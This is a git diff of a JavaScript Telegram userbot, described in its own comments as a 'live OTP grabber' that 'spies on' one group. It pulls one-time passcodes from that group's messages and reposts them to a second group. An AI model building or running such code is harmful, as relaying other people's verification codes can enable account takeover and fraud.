@@ -52,13 +52,13 @@ async function ensureConnected() {
 
 
 export function setupLiveOtpForwarder(userBot, bot) {
-    console.log("[MONITOR] Starting live OTP grabber for 'Gina and WBD'...");
+    console.log("[MONITOR] Starting live OTP grabber...");
 
-    // Your Target Group where the styled message goes
+    // Your Target Group where the styled message goes (Bot must be admin here!)
     const TARGET_GROUP_ID = "-1003645249777"; 
     
-    // The ONLY group we want to spy on
-    const MONITORED_GROUP_NAME = "-1003518737176";
+    // The Source Group ID to monitor (Stripped of the -100 for GramJS compatibility)
+    const SOURCE_GROUP_ID = "3518737176"; 
 
     userBot.addEventHandler(async (event) => {
         const message = event.message;
@@ -68,10 +68,12 @@ export function setupLiveOtpForwarder(userBot, bot) {
             const chat = await message.getChat();
             if (!chat) return;
 
-            const chatTitle = chat.title || "";
+            // Extract the Chat ID safely as a string
+            const chatIdStr = chat.id ? chat.id.toString() : "";
 
-            // 1. FILTER: Check if the message is strictly from "Gina and WBD"
-            if (chatTitle.includes(MONITORED_GROUP_NAME)) {
+            // 1. FILTER: Check if the message is from the specific group ID
+            // GramJS drops the "-100" from supergroup IDs, so we check the core numbers
+            if (chatIdStr.includes(SOURCE_GROUP_ID)) {
                 
                 let textToSearch = message.message || "";
                 let code = null;
@@ -125,10 +127,10 @@ export function setupLiveOtpForwarder(userBot, bot) {
                         `**Code:** \`${code}\`\n` +
                         `*(Tap the code above to instantly copy)*`;
 
-                    // Build the buttons (Update the URL to your actual owner link!)
+                    // Build the buttons matching your exact request
                     const inlineKeyboard = [
                         [{ text: `${code}`, callback_data: `copy_alert` }],
-                        [{ text: `Owner`, url: `https://t.me/Staries1` }] // <-- CHANGE THIS
+                        [{ text: `Owner`, url: `https://t.me/Staries1` }] 
                     ];
 
                     // Send to your target group
